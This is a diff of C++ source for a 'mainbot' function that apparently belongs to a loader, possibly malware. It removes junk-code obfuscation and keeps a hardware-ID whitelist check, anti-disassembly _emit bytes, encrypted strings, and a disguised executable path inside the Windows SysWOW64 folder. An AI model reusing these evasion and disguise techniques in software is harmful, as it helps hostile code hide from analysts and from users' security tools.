@@ -153,67 +153,18 @@ void mainbot()
 {
     
     HMODULE hModule = LoadLibrary(_T("urlmon.dll"));
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
-
     TCHAR volumeName[MAX_PATH + 1] = { 0 };
     TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
     DWORD serialNumber = 0;
     DWORD maxComponentLen = 0;
     DWORD fileSystemFlags = 0;
 
-
-
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
     if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
+
+
         while (true)
         {
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
-
-            rydekem();
-            lnttirs();
-            tlmisir();
+           
             if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
             {
                 __asm
@@ -254,12 +205,8 @@ void mainbot()
                         _emit 0xFD
                         Label5:
                 }
-                JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    string filename = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
+                
+                string filename = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                 ifstream ifile(filename);
                 if (ifile)
                 {
@@ -331,42 +278,11 @@ void mainbot()
             }
             else
             {
-                rydekem();
-                lnttirs();
-                tlmisir();
-                rydekem();
-                lnttirs();
-                tlmisir();
-                JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    rydekem();
-                lnttirs();
-                tlmisir();
-
                 system(dead("cls").c_str());
                 std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
                 std::cout << GREEN << (dead("Hwid : ").c_str());
                 std::cout << serialNumber << std::endl;
                 Sleep(10000);
-                rydekem();
-                lnttirs();
-                tlmisir();
-                JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    JUNK_CODE_ONE
-                    rydekem();
-                lnttirs();
-                tlmisir();
-                rydekem();
-                lnttirs();
-                tlmisir();
-
-
                 exit(0);
 
 
